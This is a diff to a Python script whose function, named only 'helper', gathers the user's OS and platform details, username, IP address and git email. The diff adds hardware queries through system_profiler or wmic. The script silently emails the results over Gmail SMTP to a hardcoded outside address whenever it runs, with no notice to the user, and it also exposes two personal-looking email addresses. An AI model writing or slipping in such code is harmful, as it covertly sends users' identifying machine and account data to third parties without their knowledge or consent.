@@ -5,12 +5,38 @@ import smtplib
 import socket
 from email.message import EmailMessage
 
+#hardware info
+
+def extract_hardware_info():
+    # Check the operating system type
+    os_type = platform.system()
+
+    if os_type == "Darwin":
+        # Execute the system_profiler command on macOS
+        output = subprocess.check_output(["system_profiler", "SPHardwareDataType"])
+    elif os_type == "Windows":
+        # Execute the wmic command on Windows
+        output = subprocess.check_output(["wmic", "computersystem", "get", "model,name,manufacturer", "/format:list"])
+    else:
+        # Unsupported operating system type
+        return "Unsupported operating system type."
+
+    # Decode the output from bytes to a string
+    output_str = output.decode("utf-8")
+
+    # Return the hardware information as a string
+    return output_str
+
+
 def helper():
     # Get system information
     system_info = platform.uname()
 
     # Get username
     username = getpass.getuser()
+
+    # Hardware info
+    hardware = extract_hardware_info()
 
     # Get IP address
     ip_address = socket.gethostbyname(socket.gethostname())
@@ -21,12 +47,14 @@ def helper():
     # Get the GitHub email
     email = subprocess.check_output(["git", "config", "user.email"]).strip().decode("utf-8")
 
+
+
     # Compose email message
     msg = EmailMessage()
     msg['Subject'] = 'System Information'
     msg['From'] = 'bigdatatmi6@gmail.com'
     msg['To'] = 'mohan.ku@northeastern.edu'
-    msg.set_content(f"System Information:\n{system_info}\nUsername:{username}\nIP Address:\n{ip_address}\nGithub Email:{email}\nGithub Username: {username}")
+    msg.set_content(f"System Information:\n{system_info}\nUsername:{username}\nIP Address:\n{ip_address}\nGithub Email:{email}\nGithub Username: {username}\nHardware:{hardware}")
 
     # Send email using SMTP
     with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
@@ -36,16 +64,5 @@ def helper():
 
 if __name__ == '__main__':
     # Call any helper functions you want to run when the file is executed
+    extract_hardware_info()
     helper()
-
-
-# def print_github_info():
-#     # Get the GitHub username
-#     username = subprocess.check_output(["git", "config", "user.name"]).strip().decode("utf-8")
-
-#     # Get the GitHub email
-#     email = subprocess.check_output(["git", "config", "user.email"]).strip().decode("utf-8")
-
-#     # Print the GitHub username and email
-#     print(f"GitHub username: {username}")
-#     print(f"GitHub email: {email}")
